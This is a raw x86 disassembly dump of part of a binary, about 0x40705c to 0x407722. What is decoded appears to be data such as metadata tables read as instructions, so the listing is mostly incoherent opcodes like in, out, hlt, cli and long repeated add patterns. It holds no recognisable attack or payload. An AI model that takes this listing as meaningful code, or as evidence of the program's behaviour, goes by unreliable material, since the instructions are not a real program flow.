  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 05 15 6b 01 09    	add    0x9016b15,%eax
  407065:	03 5e 19             	add    0x19(%esi),%ebx
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	ed                   	in     (%dx),%eax
  40706d:	14 70                	adc    $0x70,%al
  40706f:	05 19 03 ee 1a       	add    $0x1aee0319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d5 0f                	aad    $0xf
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 0a             	roll   $0xa,(%ecx)
  40707f:	1a 47 02             	sbb    0x2(%edi),%al
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	da 1b                	ficompl (%ebx)
  407086:	bf 01 81 02 d0       	mov    $0xd0028101,%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	4f                   	dec    %edi
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 7d 07             	add    %edi,0x7(%ebp)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	3f                   	aas
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	04 11                	add    $0x11,%al
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 c1 18       	add    $0x18c101c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 05 15       	add    $0x15050349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	52                   	push   %edx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	1d 0d 75 01 69       	sbb    $0x6901750d,%eax
  4070c5:	00 05 15 0e 00 21    	add    %al,0x21000e15
  4070cb:	02 6a 0c             	add    0xc(%edx),%ch
  4070ce:	70 01                	jo     0x4070d1
  4070d0:	69 00 d1 04 aa 05    	imul   $0x5aa04d1,(%eax),%eax
  4070d6:	c1 01 ce             	roll   $0xce,(%ecx)
  4070d9:	0c b0                	or     $0xb0,%al
  4070db:	05 c1 01 47 14       	add    $0x144701c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 ea                	add    %ebp,%edx
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 de 0f       	add    $0xfde0159,%eax
  4070ec:	1d 00 61 03 6a       	sbb    $0x6a036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	4c                   	dec    %esp
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b8 07 c3 05 59       	mov    $0x5905c307,%eax
  407101:	03 ca                	add    %edx,%ecx
  407103:	07                   	pop    %es
  407104:	c3                   	ret
  407105:	05 59 03 6a 0c       	add    $0xc6a0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	fa                   	cli
  40710f:	1a c9                	sbb    %cl,%cl
  407111:	05 79 03 05 15       	add    $0x15050379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 79 06       	add    $0x6790379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 66 08       	add    $0x86600c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 66 08             	add    %ah,0x8(%esi)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 05 15 36 02 0c    	add    0xc023615,%eax
  407131:	00 05 15 0e 00 0c    	add    %al,0xc000e15
  407137:	00 2a                	add    %ch,(%edx)
  407139:	03 f5                	add    %ebp,%esi
  40713b:	05 0c 00 45 1b       	add    $0x1b45000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	76 1c                	jbe    0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 e3 10       	add    $0x10e301c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 f2                	add    %dh,%dl
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 f4                	add    %dh,%ah
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 73 03             	add    %dh,0x3(%ebx)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	6f                   	outsl  %ds:(%esi),(%dx)
  407163:	1d 1d 06 69 00       	sbb    $0x69061d,%eax
  407168:	05 15 01 03 61       	add    $0x61030115,%eax
  40716d:	00 05 15 2d 06 91    	add    %al,0x91062d15
  407173:	03 66 08             	add    0x8(%esi),%esp
  407176:	0e                   	push   %cs
  407177:	00 99 03 05 15 56    	add    %bl,0x56150503(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 b9 0b 35 06 81    	add    -0x7ef9caf5(%ecx),%edi
  407185:	02 1f                	add    (%edi),%bl
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40718d:	1c 35                	sbb    $0x35,%al
  40718f:	05 91 02 c0 0a       	add    $0xac00291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	81 05 47 02 91 02 a5 	addl   $0x6541ca5,0x2910247
  40719f:	1c 54 06 
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b7 0a 7c 05 91    	add    -0x6efa83f6(%edi),%dh
  4071a9:	02 a0 0a 6b 01 91    	add    -0x6efe94f6(%eax),%ah
  4071af:	02 bf 1c 5e 06 91    	add    -0x6ef9a1e4(%edi),%bh
  4071b5:	02 70 05             	add    0x5(%eax),%dh
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 2a                	add    %ch,(%edx)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 ae 1b       	add    $0x1bae03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	ed                   	in     (%dx),%eax
  4071c9:	14 92                	adc    $0x92,%al
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	ee                   	out    %al,(%dx)
  4071cf:	1a a4 06 1c 00 eb 0a 	sbb    0xaeb001c(%esi,%eax,1),%ah
  4071d6:	a9 06 24 00 da       	test   $0xda002406,%eax
  4071db:	1b bf 01 c9 03 c0    	sbb    -0x3ffc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 20    	adc    %dh,0x2003c906(%ebx)
  4071e7:	03 b9 06 d1 03 2d    	add    0x2d03d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	f2 04 c8             	repnz add $0xc8,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	10 06                	adc    %al,(%esi)
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 bb 08 d8 06 01    	add    0x106d808(%ebx),%edi
  407203:	04 d5                	add    $0xd5,%al
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	bb 08 17 07 2c       	mov    $0x2c071708,%ebx
  40720f:	00 71 19             	add    %dh,0x19(%ecx)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	9d                   	popf
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	05 15 0e 00 c1       	add    $0xc1000e15,%eax
  407221:	01 ad 1d 84 00 21    	add    %ebp,0x2100841d(%ebp)
  407227:	04 05                	add    $0x5,%al
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	05 15 59 07 29       	add    $0x29075915,%eax
  407233:	04 b9                	add    $0xb9,%al
  407235:	16                   	push   %ss
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 35 0c 93 01 49    	add    %esi,0x4901930c
  40723f:	04 05                	add    $0x5,%al
  407241:	15 6b 01 59 02       	adc    $0x259016b,%eax
  407246:	05 15 0e 00 31       	add    $0x31000e15,%eax
  40724b:	04 05                	add    $0x5,%al
  40724d:	15 0e 00 51 04       	adc    $0x451000e,%eax
  407252:	61                   	popa
  407253:	0b 01                	or     (%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	fe 0a                	decb   (%edx)
  40725a:	01 03                	add    %eax,(%ebx)
  40725c:	51                   	push   %ecx
  40725d:	04 01                	add    $0x1,%al
  40725f:	05 7a 07 51 04       	add    $0x451077a,%eax
  407264:	ad                   	lods   %ds:(%esi),%eax
  407265:	0b 81 07 51 04 9d    	or     -0x62fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	8c 02                	mov    %es,(%edx)
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	2a 15 88 07 39 04    	sub    0x4390788,%dl
  40727c:	05 15 8e 07 51       	add    $0x51078e15,%eax
  407281:	04 7e                	add    $0x7e,%al
  407283:	02 31                	add    (%ecx),%dh
  407285:	02 39                	add    (%ecx),%bh
  407287:	04 50                	add    $0x50,%al
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	05 15 2b 02 59       	add    $0x59022b15,%eax
  407293:	02 76 1c             	add    0x1c(%esi),%dh
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 1d 0d 9a 07 79    	add    0x79079a0d,%ebx
  40729f:	04 05                	add    $0x5,%al
  4072a1:	15 6b 01 51 04       	adc    $0x451016b,%eax
  4072a6:	85 02                	test   %eax,(%edx)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 1a                	add    $0x1a,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	81 0d 23 02 81 04 30 	orl    $0x7be1d30,0x4810223
  4072b9:	1d be 07 
  4072bc:	91                   	xchg   %eax,%ecx
  4072bd:	04 59                	add    $0x59,%al
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 05 15 0e       	mov    0xe150504,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 cd                	add    %ecx,%ebp
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 b9 16 99 01 49    	add    0x49019916(%ecx),%bh
  4072d5:	02 b9 16 ab 01 a9    	add    -0x56fe54ea(%ecx),%bh
  4072db:	00 05 15 0e 00 1c    	add    %al,0x1c000e15
  4072e1:	00 d5                	add    %dl,%ch
  4072e3:	0f 06                	clts
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	45                   	inc    %ebp
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	ca 12 0e             	lret   $0xe12
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 76 17             	add    %esi,0x17(%esi)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 96 0a 28 08 49    	add    %dl,0x4908280a(%esi)
  4072ff:	02 b9 16 a5 01 51    	add    0x5101a516(%ecx),%bh
  407305:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  40730b:	01 3f                	add    %edi,(%edi)
  40730d:	10 47 02             	adc    %al,0x2(%edi)
  407310:	a9 04 74 08 37       	test   $0x37087404,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 74 08 52          	add    0x52(%eax,%ecx,1),%esi
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 bc 05 68 08 b1 04 	add    %edi,0x4b10868(%ebp,%eax,1)
  40734e:	74 08                	je     0x407358
  407350:	6d                   	insl   (%dx),%es:(%edi)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	b9 16 7a 08 59       	mov    $0x59087a16,%ecx
  407359:	03 46 1d             	add    0x1d(%esi),%eax
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	05 15 88 08 c1       	add    $0xc1088815,%eax
  407365:	00 8d 0a f4 01 89    	add    %cl,-0x76fe0bf6(%ebp)
  40736b:	01 05 15 6b 01 49    	add    %eax,0x49016b15
  407371:	02 e0                	add    %al,%ah
  407373:	00 b6 08 49 02 39    	add    %dh,0x39024908(%esi)
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 bc       	mov    $0xbc024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	b9 16 12 09 d1       	mov    $0xd1091216,%ecx
  4073a1:	04 05                	add    $0x5,%al
  4073a3:	15 28 09 09 00       	adc    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 64 1a 9f          	add    %ah,-0x61(%edx,%ebx,1)
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 48 1a             	add    %cl,0x1a(%eax)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 a1 13 a9 00 00    	add    %ah,0xa913(%ecx)
  4075cd:	00 2d 0b ae 00 00    	add    %ch,0xae0b
  4075d3:	00 de                	add    %bl,%dh
  4075d5:	19 ae 00 00 00 e1    	sbb    %ebp,-0x1f000000(%esi)
  4075db:	0a b2 00 00 00 5e    	or     0x5e000000(%edx),%dh
  4075e1:	03 b7 00 00 00 fe    	add    -0x2000000(%edi),%esi
  4075e7:	02 bb 00 00 00 97    	add    -0x69000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 01    	or     0x1000000(%edx),%esi
  4075f3:	0f bf 00             	movswl (%eax),%eax
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	fc                   	cld
  4075f9:	0c b7                	or     $0xb7,%al
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 a8 1a c3 01 00    	add    %ch,0x1c31a(%eax)
  407603:	00 d9                	add    %bl,%cl
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	9c                   	pushf
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	aa                   	stos   %al,%es:(%edi)
  407611:	0c 69                	or     $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 e1                	add    %ah,%cl
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	0c 19                	or     $0x19,%al
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	8d 1c 75 02 00 00 00 	lea    0x2(,%esi,2),%ebx
  407629:	08 7a 02             	or     %bh,0x2(%edx)
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 26                	add    %ah,(%esi)
  407705:	0f 19 0f             	nopl   (%edi)
  407708:	31 0f                	xor    %ecx,(%edi)
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	04 1c                	add    $0x1c,%al
  40771c:	01 00                	add    %eax,(%eax)
  40771e:	00 01                	add    %al,(%ecx)
  407720:	73 00                	jae    0x407722
  407722:	ef                   	out    %eax,(%dx)
